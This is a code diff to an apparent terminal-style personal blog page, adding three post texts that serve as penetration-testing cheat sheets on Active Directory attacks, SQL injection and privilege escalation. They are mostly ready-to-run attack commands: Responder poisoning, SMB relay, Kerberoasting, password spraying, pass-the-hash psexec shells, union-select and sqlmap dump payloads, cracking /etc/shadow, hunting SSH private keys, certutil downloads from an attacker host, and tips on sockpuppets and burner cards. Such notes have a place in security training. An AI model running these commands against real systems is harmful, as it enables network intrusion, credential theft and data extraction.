@@ -131,11 +131,14 @@
 │  [ 4 ] Dynamic Link Library (DLL) Injection                      2026-06-20 │
 │  [ 5 ] Payload Encryption & Obfuscation                          2026-06-20 │
 │  [ 6 ] Windows Structures & Data Types                           2026-06-20 │
+│  [ 7 ] Active Directory Attacks & Exploitation                   2026-06-20 │
+│  [ 8 ] Web Application Attacks & SQL Injection                   2026-06-20 │
+│  [ 9 ] Penetration Testing Tradecraft                            2026-06-20 │
 │                                                                              │
-│  [1-6] read | [0] main menu                                                 │
+│  [1-9] read | [0] main menu                                                 │
 │                                                                              │
 └──────────────────────────────────────────────────────────────────────────────┘`;
-				this.hint.textContent = '[1-6] select | [0] main menu';
+				this.hint.textContent = '[1-9] select | [0] main menu';
 			}
 			viewpost() {
 				this.state.mode = 'post';
@@ -227,7 +230,161 @@ CALLING CONVENTIONS
 __cdecl - C default (params right-to-left on stack)
 __stdcall - Windows API (params right-to-left on stack)
 __fastcall - Params in registers (ECX, EDX then stack)
-__thiscall - C++ member functions (ECX = this pointer)`
+__thiscall - C++ member functions (ECX = this pointer)`,
+					7: `ACTIVE DIRECTORY ATTACKS & EXPLOITATION
+
+LLMNR POISONING
+Start with mitm6 and responder
+1. Scan to generate traffic
+2. Check for default credentials
+3. Enumerate AD environment
+
+Responder LLMNR Capture
+sudo responder -I <adapter> -dPv
+
+Target Hash Cracking
+hashcat -m 5500 <hash.txt> <wordlist>
+
+SMB RELAY ATTACKS
+Detect vulnerable targets:
+nmap --script=smb2-security-mode.nse -p 445 <target>
+Look for: Message signing enabled but not required
+
+Disable SMB/HTTP in responder config:
+sudo vim /etc/responder/Responder.conf
+
+Run responder:
+sudo responder -I <interface> -dP
+
+Set up SMB relay:
+sudo ntlmrelayx.py -tf targets.txt -smb2support
+
+KERBEROASTING
+Extract SPNs:
+impacket-GetUserSPNs <DOMAIN/user:pass> -dc-ip <ip> -request
+
+Crack Kerberos hashes:
+hashcat -m 13100 <hash.txt> <wordlist.txt>
+
+BLOODHOUND ENUMERATION
+Start Neo4j: sudo neo4j console
+Start BloodHound: sudo bloodhound
+Ingest data: sudo bloodhound-python -d <domain> -u <user> -p <pass> -ns <IP> -c all
+
+CREDENTIAL ATTACKS
+Password policy enum:
+crackmapexec smb <DC-IP> -u <user> -p <pass> --pass-pol
+
+User enumeration (Kerbrute):
+kerbrute userenum -d <Domain> --dc <DC-IP> users.txt
+
+Password spraying:
+crackmapexec smb <DC-IP> -u users.txt -p Password123 | grep +
+
+SHELL ACCESS
+With password: impacket-psexec <domain>/<user>:'<pass>'@<DC-IP>
+With hash: impacket-psexec <user>@<DC-IP> -hashes <LM>:<NT>`,
+					8: `WEB APPLICATION ATTACKS & SQL INJECTION
+
+OWASP TOP 10
+1. Broken Access Control
+2. Cryptographic Failures
+3. Injection
+4. Insecure Design
+5. Security Misconfiguration
+6. Vulnerable and Outdated Components
+7. Authentication Failures
+8. Software and Data Integrity Failures
+9. Logging and Monitoring Failures
+10. Server-Side Request Forgery (SSRF)
+
+SQL INJECTION DETECTION
+Try single and double quotes: '', ""
+Comments: --, #
+Test payloads:
+<name>' or 1=1#
+<name>' union select null, null#
+
+URL ENCODING
+' = %27
+" = %22
+# = %23
+; = %3B
+) = %29
+
+UNION-BASED INJECTION
+Determine column count:
+<name>' union select null, null, null#
+
+Extract data:
+<name>' union select null,null,version()#
+<name>' union select null,null,table_name from information_schema.tables#
+
+BOOLEAN-BASED INJECTION
+Use conditional statements to control response
+If true, original query response returned
+If false, no output
+
+TIME-BASED INJECTION
+Use SLEEP() function to delay response
+Useful when no obvious output is returned
+
+BLIND SQL INJECTION
+No obvious clue when executed
+Requires conditional logic for data extraction
+
+SQL-MAP AUTOMATION
+Save HTTP POST request as .txt
+sqlmap -r request.txt --dbs
+sqlmap -r request.txt -D database --tables
+sqlmap -r request.txt -D database -T table --dump`,
+					9: `PENETRATION TESTING TRADECRAFT
+
+LINUX PRIVILEGE ESCALATION
+Find SUID binaries:
+find / -type f -perm -4000 2>/dev/null
+
+Check GTFOBins for exploits:
+/home/user/tools/linux-exploit-suggester/linux-exploit-suggester.sh
+
+Check password history:
+cat ~/.bash_history | grep -i passwd
+
+Crack /etc/shadow:
+unshadow /etc/passwd /etc/shadow > unshadowed.txt
+hashcat -m 1800 unshadowed.txt rockyou.txt -O
+
+Find SSH keys:
+find / -name authorized_keys 2>/dev/null
+find / -name id_rsa 2>/dev/null
+
+Check binary capabilities:
+getcap -r / 2>/dev/null
+Look for: cap_sys_admin, cap_setuid, cap_setpcap
+
+Spawn TTY shell:
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+WINDOWS PRIVILEGE ESCALATION
+Download files:
+certutil.exe -urlcache -f http://<lhost>/<filename> <name>
+
+Run WinPEAS:
+certutil -urlcache -f http://<lhost>/winpeas.exe C:\\temp\\winpeas.exe
+.\winpeas.exe
+
+GENERAL TRADECRAFT
+BurpSuite "Limit Scope" in proxy settings
+OSINT sockpuppet creation:
+- FakeNameGenerator.com
+- ThisPersonDoesNotExist.com
+- Privacy.com for burner cards
+
+Search operators:
+site:<url>, "text", AND, filetype:<ext>, -<not>, intext:<string>
+
+Username generation:
+git clone https://github.com/insidetrust/statistically-likely-usernames.git`
 				};
 				const fullText = posts[this.selectedPost] || posts[1];
 				this.currentPostLines = fullText.split('\n');
